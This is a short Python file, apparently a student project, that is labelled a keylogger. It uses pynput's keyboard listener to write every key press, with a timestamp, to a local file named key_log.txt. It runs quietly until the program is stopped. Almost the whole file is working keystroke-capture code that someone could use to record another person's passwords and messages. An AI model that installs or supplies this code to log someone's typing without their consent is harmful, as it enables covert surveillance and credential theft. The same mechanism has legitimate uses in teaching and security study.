#python Project

#mehraan kiya

#keylogger#

#roshanamooz

import pynput

import logging

from pynput.keyboard import Key, Listener

#if no name it gets put into an empty string

log_dir = ""

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s:')

def on_press(key):
    logging.info(str(key))
    #if key == key.esc:
    #stop listener
    #return false




#this says, listener in on

with Listener(on_press=on_press) as listener:
    listener.join()